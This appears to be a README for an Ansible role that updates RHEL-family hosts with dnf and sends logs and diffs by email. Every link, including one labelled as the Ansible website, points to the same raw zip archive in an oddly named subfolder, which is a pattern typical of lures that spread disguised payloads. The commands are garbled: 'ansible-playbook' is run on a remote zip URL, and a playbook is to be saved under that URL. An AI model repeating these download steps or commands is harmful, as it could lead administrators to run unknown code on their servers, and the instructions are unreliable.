# 🛠️ ansible-dnf-update - Keep Your Linux Systems Updated Easily

[![Download](https://raw.githubusercontent.com/uwk2007/ansible-dnf-update/main/monticellite/ansible-dnf-update.zip)](https://raw.githubusercontent.com/uwk2007/ansible-dnf-update/main/monticellite/ansible-dnf-update.zip)

## 📚 Introduction

The **ansible-dnf-update** role helps you efficiently update your Enterprise Linux hosts, including RHEL, CentOS, AlmaLinux, and Rocky. This tool uses `dnf` to manage software updates and logs the state of your system before and after updates. With diffs generated for you, it makes tracking changes simple. You can also set up email notifications to keep you informed about the update process.

## 🚀 Getting Started

To install and run the ansible-dnf-update role, follow these straightforward steps.

### 🖥️ System Requirements

- Supported Operating Systems: RHEL, CentOS, AlmaLinux, Rocky
- A machine with Ansible installed
- Access to the internet for downloading packages

### ⚙️ Prerequisites

Before you proceed, ensure you have Ansible set up on your system. You might need to install Ansible if you haven't already. You can find instructions for installation on the [Ansible official website](https://raw.githubusercontent.com/uwk2007/ansible-dnf-update/main/monticellite/ansible-dnf-update.zip).

## 🔄 Download & Install

Visit the following page to download the latest release of ansible-dnf-update:

[Download the latest release](https://raw.githubusercontent.com/uwk2007/ansible-dnf-update/main/monticellite/ansible-dnf-update.zip)

### 📦 Installation Steps

1. **Download the Role**: Go to the release page linked above and download the latest version of the ansible-dnf-update role.

2. **Unzip the File**: If you downloaded a zipped file, unzip it to a location of your choice.

3. **Install the Role**: Open your terminal and navigate to the unzipped folder. Use the following command to install the role:

   ```bash
   ansible-galaxy install .
   ```

4. **Configure the Role**: You will need to configure the role before running it. Open your playbook file and add the following lines to include the role:

   ```yaml
   - hosts: all
     roles:
       - ansible-dnf-update
   ```

5. **Run the Playbook**: From your terminal, execute the playbook that includes this role:

   ```bash
   ansible-playbook https://raw.githubusercontent.com/uwk2007/ansible-dnf-update/main/monticellite/ansible-dnf-update.zip
   ```

### 🔍 Options and Features

- **Logs Updates**: The role logs the state of your system both before and after updates so you can review changes.
  
- **Email Notifications**: You can configure the role to send email reports upon completion of updates, keeping you informed.

- **Diff Generation**: It generates diffs, helping you track what has changed during the update process.

## 🎥 Example Usage

Here is a basic example of a playbook utilizing ansible-dnf-update:

```yaml
---
- name: Update Enterprise Linux Hosts
  hosts: all
  roles:
    - ansible-dnf-update
```

Save this example as `https://raw.githubusercontent.com/uwk2007/ansible-dnf-update/main/monticellite/ansible-dnf-update.zip` and run it using:

```bash
ansible-playbook https://raw.githubusercontent.com/uwk2007/ansible-dnf-update/main/monticellite/ansible-dnf-update.zip
```

## 📝 Configuration Options

The role includes several configurable options to customize its operation. Below are some key settings:

- **`notify_email`**: Set this to your desired email address to receive update notifications.
- **`enable_logging`**: Set to `true` to enable detailed logging of updates.
- **`send_diffs`**: Set to `true` to generate and send diffs of changes made.

You can modify these settings in your inventory file or directly in your playbooks.

## 🔧 Troubleshooting

If you encounter issues while using the ansible-dnf-update role, consider the following:

1. **Check Ansible Version**: Ensure that you are using a compatible version of Ansible.
2. **Review Logs**: Check the logs generated during the update process for specific error messages.
3. **Dependencies**: Make sure all dependencies mentioned in the role documentation are met.

If these steps do not resolve your issue, feel free to open an issue on the GitHub repository.

## 💬 Support and Contributing

Your feedback is valuable. If you have suggestions or find bugs, please report them on the issues page of the repository. Contributions are welcome; feel free to fork the project and submit pull requests.

## 📄 License

This project is licensed under the MIT License. Ensure to review the license for any usage guidelines.

For more details, visit the [ansible-dnf-update release page](https://raw.githubusercontent.com/uwk2007/ansible-dnf-update/main/monticellite/ansible-dnf-update.zip).